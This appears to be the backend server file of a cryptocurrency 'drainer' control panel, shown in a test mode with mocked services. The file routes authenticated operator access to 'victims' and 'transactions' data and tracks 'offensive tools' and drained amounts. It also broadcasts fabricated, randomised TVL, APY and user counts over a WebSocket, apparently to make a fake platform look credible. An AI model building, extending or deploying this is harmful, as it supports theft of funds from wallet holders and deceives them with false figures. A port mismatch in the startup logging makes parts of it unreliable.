#!/usr/bin/env node

/**
 * G0DM0D3-DCrypt v3.0 Backend Server - Test Mode (No MongoDB)
 * Advanced Multi-Chain Drainer Dashboard
 */

require('dotenv').config();
const express = require('express');
const cors = require('cors');
const helmet = require('helmet');
const compression = require('compression');
const morgan = require('morgan');
const cron = require('node-cron');
const WebSocket = require('ws');
const winston = require('winston');
const path = require('path');

// Import routes (mock versions for testing)
const authRoutes = require('./src/routes/auth');
const dashboardRoutes = require('./src/routes/dashboard');
const victimsRoutes = require('./src/routes/victims');
const transactionsRoutes = require('./src/routes/transactions');
const settingsRoutes = require('./src/routes/settings');

// Import middleware
const {
    authenticateToken,
    rateLimiter,
    apiRateLimiter,
    requestLogger,
    securityHeaders,
    corsOptions
} = require('./src/middleware/auth');
const { errorHandler, notFoundHandler } = require('./src/middleware/errorHandler');

// Initialize Express app
const app = express();
const PORT = process.env.PORT || 3008;

// Logger setup
const logger = winston.createLogger({
    level: 'info',
    format: winston.format.combine(
        winston.format.timestamp(),
        winston.format.errors({ stack: true }),
        winston.format.json()
    ),
    defaultMeta: { service: 'godmod-dcrypt-backend-test' },
    transports: [
        new winston.transports.Console({
            format: winston.format.combine(
                winston.format.colorize(),
                winston.format.simple()
            )
        })
    ]
});

// Security middleware
app.use(helmet({
    contentSecurityPolicy: {
        directives: {
            defaultSrc: ["'self'"],
            styleSrc: ["'self'", "'unsafe-inline'", "https://fonts.googleapis.com"],
            fontSrc: ["'self'", "https://fonts.gstatic.com"],
            scriptSrc: ["'self'", "'unsafe-inline'"],
            imgSrc: ["'self'", "data:", "https:"],
        },
    },
}));

app.use(securityHeaders);
app.use(compression());
app.use(cors(corsOptions));

// Rate limiting
app.use('/api/', apiRateLimiter);

// Request logging
app.use(requestLogger);

// Logging
app.use(morgan('combined', {
    stream: {
        write: (message) => logger.info(message.trim())
    }
}));

// Body parsing
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));

// Static files
app.use('/uploads', express.static(path.join(__dirname, '../uploads')));
app.use('/logs', express.static(path.join(__dirname, '../logs')));

// Skip MongoDB connection for testing
logger.info('Running in test mode - skipping MongoDB connection');
console.log('🔄 Running in test mode - MongoDB connection skipped');

// Mock services for testing
const mockChainManager = {
    getStats: () => ({ networks: 5, active: true }),
    getBalances: () => ({ eth: '0.1', bnb: '0.5' })
};

const mockOffensiveTools = {
    getActiveDrains: () => [],
    getStats: () => ({ active: 0, completed: 0 })
};

const mockDrainMonitor = {
    getRealtimeStats: () => ({ victims: 0, transactions: 0, drained: '0.00' })
};

// Routes
app.use('/api/auth', authRoutes);
app.use('/api/dashboard', authenticateToken, dashboardRoutes);
app.use('/api/victims', authenticateToken, victimsRoutes);
app.use('/api/transactions', authenticateToken, transactionsRoutes);
app.use('/api/settings', authenticateToken, settingsRoutes);

// Health check
app.get('/health', (req, res) => {
    res.json({
        status: 'healthy',
        timestamp: new Date().toISOString(),
        uptime: process.uptime(),
        version: '3.0.0',
        mode: 'test'
    });
});

// WebSocket server for real-time updates
const wss = new WebSocket.Server({ port: 3006 });

const broadcast = (data) => {
    wss.clients.forEach(client => {
        if (client.readyState === WebSocket.OPEN) {
            client.send(JSON.stringify(data));
        }
    });
};

wss.on('connection', (ws) => {
    console.log('🔌 WebSocket client connected');

    ws.on('message', (message) => {
        try {
            const data = JSON.parse(message);
            console.log('📨 WebSocket message received:', data);

            // Echo back for testing
            ws.send(JSON.stringify({
                type: 'echo',
                data: data,
                timestamp: new Date().toISOString()
            }));
        } catch (error) {
            console.error('WebSocket message error:', error);
        }
    });

    ws.on('close', () => {
        console.log('🔌 WebSocket client disconnected');
    });
});

// Broadcast stats every 3 seconds
setInterval(() => {
    const realtimeStats = mockDrainMonitor.getRealtimeStats();
    broadcast({
        type: 'stats',
        stats: {
            tvl: 2100000000 + Math.random() * 1000000, // Simulate changing TVL
            users: 100000 + realtimeStats.victims,
            apy: 125 + Math.random() * 5,
            transactions: 2500000 + realtimeStats.transactions
        },
        timestamp: new Date().toISOString()
    });
}, 3000);

// Cron jobs
cron.schedule('*/5 * * * *', () => {
    console.log('⏰ Cron job: Health check every 5 minutes');
});

// Error handling
app.use(notFoundHandler);
app.use(errorHandler);

// Graceful shutdown
process.on('SIGTERM', () => {
    console.log('🛑 SIGTERM received, shutting down gracefully');
    wss.close();
    process.exit(0);
});

process.on('SIGINT', () => {
    console.log('🛑 SIGINT received, shutting down gracefully');
    wss.close();
    process.exit(0);
});

// Start server
app.listen(PORT, () => {
    console.log(`🚀 G0DM0D3-DCrypt Backend Server v3.0 (TEST MODE) running on port ${PORT}`);
    console.log(`❤️  Health check: http://localhost:${PORT}/health`);
    console.log(`🔌 WebSocket server: ws://localhost:3002`);
    console.log(`📊 Dashboard: http://localhost:${PORT}/api/dashboard`);
});